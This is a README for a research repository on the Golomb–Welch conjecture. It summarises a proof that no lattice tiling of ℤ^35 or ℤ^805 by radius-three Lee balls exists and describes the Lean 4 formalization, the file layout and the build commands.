# No lattice tiling of ℤ^35 or ℤ^805 by Lee balls of radius three

Authors: Deep Bhattacharjee (corresponding author; formerly, Electro-Gravitational
Space Propulsion Laboratory (EGSPL), Bhubaneswar, Odisha 751030, India, and formerly,
University of Calcutta, Senate House, 87/1 College Street, Kolkata 700073, West Bengal,
India; ORCID 0000-0003-0466-750X; itsdeep@live.com, d.bhattacharjee@erl-forschung.de)
and Ushashi Bhattacharya (formerly, National Taiwan University, Taipei 106319, Taiwan;
ORCID 0009-0002-2254-3914; rai.bhattacharya.in@gmail.com).

The paper: [`preprintGolombWelchRadiusThree/GolombWelchRadiusThree.pdf`](preprintGolombWelchRadiusThree/GolombWelchRadiusThree.pdf).
Everything in one file: [`MasterGolombWelchRadiusThree_masterzipfinal2.zip`](https://github.com/creelie/refactored-waddle/raw/main/MasterGolombWelchRadiusThree_masterzipfinal2.zip).
Lean formalization and programs on Zenodo: release v1.0.0, doi:[10.5281/zenodo.23398805](https://doi.org/10.5281/zenodo.23398805);
all versions, doi:[10.5281/zenodo.23398804](https://doi.org/10.5281/zenodo.23398804).

For n ≥ 1 and r ≥ 0 the Lee ball of radius r is
B^n(r) = {a ∈ ℤ^n : |a_1| + … + |a_n| ≤ r}. Golomb and Welch (1970) conjectured
that ℤ^n has no tiling by translates of B^n(r) when n ≥ 3 and r ≥ 2; the
conjecture is open, and so is its lattice form. A. Xiao and Y. Zhou
(*On the lattice tilings by Lee balls: Q-polynomials, group-ring equations, and
a decision algorithm*, [arXiv:2610.19775](https://arxiv.org/abs/2610.19775),
Theorem 5.1) applied their criteria to every pair (n, r) with n ≥ 3, r ≥ 2 and
|B^n(r)| < 2^30. They excluded lattice tilings for 1356 of the 1358 pairs and
left (35, 3) and (805, 3) open.

**Theorem.** There is no lattice tiling of ℤ^35 by B^35(3), and there is no
lattice tiling of ℤ^805 by B^805(3).

**Corollary.** If n ≥ 3, r ≥ 2 and |B^n(r)| < 2^30, then ℤ^n has no lattice
tiling by B^n(r).

Here |B^35(3)| = 59711 = 29²·71 and |B^805(3)| = 696845031 = 3·29²·179·1543.
Neither number is prime, so Szegedy's theorem does not pass from lattice
tilings to all tilings, and the theorem says nothing about tilings that are not
lattice tilings.

A lattice tiling of ℤ^n by B^n(3) is a perfect code: elements g_1, …, g_n of a
finite abelian group G with a ↦ Σ a_j g_j bijective from B^n(3) onto G. Summing
a character over the ball gives the identity
6 Σ χ = T₁³ + 3T₁T₂ + 2T₃ − 6nT₁ in a group ring. For n = 805, the projection
to ℤ/29 forces the number c(0) of g_j mapped to 0 to be 22 + 29k with k ≤ 27,
and the constant term of the identity modulo 29² forces k ≡ 28 (mod 29). For
n = 35, the projection to ℤ/71 puts one g_j over each pair ±h, and the
projection to ℤ/29 leaves three cases. One case dies modulo 29². In the other
two, a character into dual numbers over 𝔽₇₁[ℤ/29] couples the two projections
and gives a circulant system over 𝔽₇₁ with only the zero solution, which
contradicts the structure modulo 71.

## What is checked by Lean

The Lean 4 project in `lean/` (Lean v4.34.1, Mathlib v4.34.1) proves both
theorems, with no axioms beyond `propext`, `Classical.choice` and `Quot.sound`
and with no `sorry`, `native_decide` or `bv_decide`:

```lean
/-- The Lee balls of radius `r` centred at the points of `L` partition `ℤ^n`. -/
def IsLatticeTiling (n r : ℕ) (L : AddSubgroup (Fin n → ℤ)) : Prop :=
  ∀ x : Fin n → ℤ, ∃! l : Fin n → ℤ, l ∈ L ∧ ∑ j, |x j - l j| ≤ (r : ℤ)

theorem golomb_welch_35 : ¬ ∃ L : AddSubgroup (Fin 35 → ℤ), IsLatticeTiling 35 3 L
theorem golomb_welch_805 : ¬ ∃ L : AddSubgroup (Fin 805 → ℤ), IsLatticeTiling 805 3 L
```

Every step of Sections 2 to 6 of the paper is formalized. The finite
computations in 𝔽₂₉, 𝔽₇₁ and ℤ/841 are checked by the kernel with
`decide +kernel`. The corollary combines the theorem with Theorem 5.1 of Xiao
and Zhou, which is not formalized.

## Contents

| Path | Contents |
|---|---|
| `preprintGolombWelchRadiusThree/` | the paper as a PDF, the only file in the folder |
| `paper/` | LaTeX source (`main.tex`, `amsart`), the figures as PNG and the compiled `main.pdf` |
| `figures/` | TikZ sources of the four schematic figures and `make_figures.sh`, which writes them to `paper/figures/` |
| `lean/GolombWelch/Ball.lean` | Lee balls and the ball identity in a commutative ring |
| `lean/GolombWelch/GroupRing.lean`, `BallHom.lean` | the ball identity in a group ring and through a homomorphism |
| `lean/GolombWelch/Uniform.lean` | perfect codes; a surjective homomorphism takes each value equally often on the ball |
| `lean/GolombWelch/Moments.lean` | moments over ℤ/p, the Lagrange lemma, vanishing power sums |
| `lean/GolombWelch/Counts.lean`, `Pairs.lean` | the pair counts c(h) + c(−h) modulo p and the inequality they satisfy |
| `lean/GolombWelch/Mod841.lean` | the constant term of the ball identity modulo 29² |
| `lean/GolombWelch/Dual.lean`, `Joint.lean` | the joint projection to ℤ/71 × ℤ/29 through dual numbers |
| `lean/GolombWelch/Circulant.lean` | the two circulant systems over 𝔽₇₁ |
| `lean/GolombWelch/Final.lean` | no perfect code of radius three in dimensions 35 and 805 |
| `lean/GolombWelch/Tiling.lean` | lattice tilings, the reduction to perfect codes and the two theorems |
| `lean/Axioms.lean` | prints the axioms of the two theorems |
| `checks/` | independent checks of the arithmetic in Python, Julia, C and C++ |
| `scripts/run_all.sh` | builds the Lean project, checks the axioms and runs the four checks |
| `scripts/build_paper.sh` | builds the files in `dist/`, the preprint folder and the master zip |
| `journal/JOURNAL.md` | target journal (Journal of Combinatorial Theory, Series A), format rules and AI policy |
| `AI_PROVENANCE_GolombWelchRadiusThree.md` | what the AI tool did and what the authors checked |
| `dist/` | `GolombWelchRadiusThree_final2.pdf`, the LaTeX source zip `_final2-tex.zip` (with the figures as PNG) and the arXiv tarball `_final2-arxiv.tar.gz` |
| `MasterGolombWelchRadiusThree_masterzipfinal2.zip` | every file of the repository with `dist/` and the preprint folder |
| `.github/workflows/` | `verify.yml` (Lean, the four checks and the paper on every pull request) and `release.yml` (runs the checks and publishes a release) |

## Running the checks

```sh
bash scripts/run_all.sh                       # Lean and the four checks
SKIP_LEAN=1 bash scripts/run_all.sh           # the four checks only
cd lean && lake exe cache get && lake build   # Lean only; prints the axioms of the two theorems
```

Tools: elan (the toolchain is pinned in `lean/lean-toolchain`), Python 3,
Julia, a C compiler, a C++20 compiler, and pdflatex for the paper.

## License

MIT (see `LICENSE`).
